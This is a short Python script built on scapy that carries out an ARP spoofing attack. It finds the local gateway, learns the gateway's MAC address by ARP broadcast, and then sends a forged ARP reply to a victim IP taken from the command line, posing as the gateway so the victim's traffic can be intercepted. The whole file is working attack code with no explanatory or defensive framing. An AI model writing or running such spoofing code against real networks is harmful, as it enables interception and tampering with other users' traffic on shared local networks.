import sys 
from scapy.all import srp,send,Ether,ARP,conf

def Help():
    print("sys.argv[0] <target's IP> eg:"+sys.argv[0]+"192.168.1.1")
    return 
if len(sys.argv)!=2:
    Help()
    sys.exit(1)

VicIp=sys.argv[1]

gwIp = conf.route.route("0.0.0.0")[2]
print("Gateway'ip:"+gwIp)

arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gwIp)
recved = srp(arpbroadcast, timeout=2)
gw_mac = recved[0][0][1].hwsrc

print("Gateway's Mac Address:"+gw_mac)

arpspoofed=ARP(op=2, psrc=gwIp, pdst=VicIp, hwdst="08:00:27:bd:92:09")
send(arpspoofed)